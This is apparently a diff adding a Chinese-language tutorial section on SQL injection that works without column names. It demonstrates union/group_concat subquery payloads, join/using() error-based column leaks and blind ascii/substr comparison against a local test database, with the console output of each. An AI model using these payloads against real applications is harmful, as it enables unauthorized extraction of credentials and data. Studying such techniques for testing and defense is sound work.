@@ -986,3 +986,162 @@ create table user
 
 ### 无列名注入
 
+1. union
+
+```
+mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a),3,4;
++----+-----------------------+----------+-----------------+
+| id | username              | password | email           |
++----+-----------------------+----------+-----------------+
+| 1  | admin                 | admin!@# | admin@admin.org |
+| 1  | 2,admin,tim,mike,mike | 3        | 4               |
++----+-----------------------+----------+-----------------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3 as b,4 union select * from table1)a),3,4;
++----+-------------------------------------+----------+-----------------+
+| id | username                            | password | email           |
++----+-------------------------------------+----------+-----------------+
+| 1  | admin                               | admin!@# | admin@admin.org |
+| 1  | 3,admin!@#,123456,asdfqwer,asdfqwer | 3        | 4               |
++----+-------------------------------------+----------+-----------------+
+2 rows in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select * from table1 where id='1' union select 1,(select group_concat(b) from (select 1,2,3,4 as b union select * from table1)a),3,4;
++----+------------------------------------------------------------+----------+-----------------+
+| id | username                                                   | password | email           |
++----+------------------------------------------------------------+----------+-----------------+
+| 1  | admin                                                      | admin!@# | admin@admin.org |
+| 1  | 4,admin@admin.org,tim@qq.com,mike@gmail.com,mike@gmail.com | 3        | 4               |
++----+------------------------------------------------------------+----------+-----------------+
+2 rows in set
+Time: 0.008s
+```
+
+>分析
+
+```
+mysql root@localhost:sql_injection_test> select 1,2 as b,3,4 union select * from table1
++---+-------+----------+-----------------+
+| 1 | b     | 3        | 4               |
++---+-------+----------+-----------------+
+| 1 | 2     | 3        | 4               |
+| 1 | admin | admin!@# | admin@admin.org |
+| 2 | tim   | 123456   | tim@qq.com      |
+| 3 | mike  | asdfqwer | mike@gmail.com  |
+| 4 | mike  | asdfqwer | mike@gmail.com  |
++---+-------+----------+-----------------+
+5 rows in set
+Time: 0.008s
+```
+
+```
+mysql root@localhost:sql_injection_test> select group_concat(b) from (select 1,2 as b,3,4 union select * from table1)a
++-----------------------+
+| group_concat(b)       |
++-----------------------+
+| 2,admin,tim,mike,mike |
++-----------------------+
+1 row in set
+Time: 0.008s
+```
+
+第一次联合查询构造一个列名为`1,b,3,4`的表,并且表中的数据来源于`table1`,第二次联合查询将该列读出来
+
+2. union+order by
+
+看前面的`order by`注入
+
+3. join
+
+>假定union被过滤
+
+[MySQL JOIN 菜鸟教程](https://www.runoob.com/mysql/mysql-join.html)
+
+通过`join`可建立两个表之间的内连接,通过对要查询列名的表与其自身进行内连接,会产生的相同列名,从而发生错误带出数据(即列名)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211800660.png)
+
+`using()`用于两张表之间的`join`连接查询,并且`using()`中的列在两张表中都存在,由此剔除掉前一次注入时得到的列名
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201211803273.png)
+
+```
+select * from(select * from table1 as a join table1 as b)c;
+select * from(select * from table1 as a join table1 as b using (id))c;
+select * from(select * from table1 as a join table1 as b using (id,username))c;
+```
+
+4. ascii
+
+```
+mysql root@localhost:sql_injection_test> select * from test;
++------+
+| flag |
++------+
+| abcd |
++------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select 'a')>(select * from test);
++-----------------------------------+
+| (select 'a')>(select * from test) |
++-----------------------------------+
+| 0                                 |
++-----------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select 'b')>(select * from test);
++-----------------------------------+
+| (select 'b')>(select * from test) |
++-----------------------------------+
+| 1                                 |
++-----------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select 'aa')>(select * from test);
++------------------------------------+
+| (select 'aa')>(select * from test) |
++------------------------------------+
+| 0                                  |
++------------------------------------+
+1 row in set
+Time: 0.009s
+mysql root@localhost:sql_injection_test> select (select 'ab')>(select * from test);
++------------------------------------+
+| (select 'ab')>(select * from test) |
++------------------------------------+
+| 0                                  |
++------------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select 'ac')>(select * from test);
++------------------------------------+
+| (select 'ac')>(select * from test) |
++------------------------------------+
+| 1                                  |
++------------------------------------+
+1 row in set
+Time: 0.008s
+```
+
+```
+mysql root@localhost:sql_injection_test> select (select 'abb')=substr((select * from test),1,3);
++-------------------------------------------------+
+| (select 'abb')=substr((select * from test),1,3) |
++-------------------------------------------------+
+| 0                                               |
++-------------------------------------------------+
+1 row in set
+Time: 0.008s
+mysql root@localhost:sql_injection_test> select (select 'abc')=substr((select * from test),1,3);
++-------------------------------------------------+
+| (select 'abc')=substr((select * from test),1,3) |
++-------------------------------------------------+
+| 1                                               |
++-------------------------------------------------+
+1 row in set
+Time: 0.008s
+```
+
+### insert update delete注入
